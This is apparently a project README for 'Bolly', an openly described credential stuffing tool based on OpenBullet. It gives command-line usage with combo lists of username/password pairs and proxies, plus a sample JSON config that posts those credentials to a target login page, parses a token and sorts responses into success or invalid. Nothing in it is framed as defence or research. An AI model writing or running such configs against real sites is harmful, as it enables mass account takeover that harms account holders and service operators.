# Bolly

Bolly is an credentials stuffing tool based on OpenBullet high performance because it reuses the same http client [httpclient best practices](https://www.thecodebuzz.com/using-httpclient-best-practices-and-anti-patterns/)

# Usage

Open your cmd and past
```
> Bolly.exe your_config.json your_combos.txt
```
you can also specify a list of proxies ( http only )
```
> Bolly.exe your_config.json your_combos.txt your_proxies.txt
```

# Config Example

```json
{
   "Settings":{
      "Name":"Site",
      "UseCookies":false,
      "AllowAutoRedirect":true,
      "MaxDegreeOfParallelism":1
   },
   "Blocks":[
      {
         "Type":"Request",
         "Methode":"Post",
         "Url":"https://www.site.com",
         "ContentType":"application/x-www-form-urlencoded",
         "Content":"email=<USERNAME>&password=<PASSWORD>",
         "Headers":[
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma: no-cache",
            "Accept: */*"
         ],
         "LoadSource":true
      },
      {
         "Type":"Parse",
         "ParseName":"TOKEN",
         "Source":"<SOURCE>",
         "Methode":"LR",
         "FirstInput":"LeftInput",
         "SecondInput":"RightInput",
         "Capture":true
      },
      {
         "Type":"KeyCheck",
         "KeyCheckPattern":[
            {
               "Status":"Invalid",
               "Source":"<SOURCE>",
               "Condition":"Contains",
               "Key":"InvalidKey"
            },
            {
               "Status":"Success",
               "Source":"<RESPONSECODE>",
               "Condition":"Equal",
               "Key":"200"
            }
         ],
         "RetryIfNotFound":true
      }
   ]
}
```
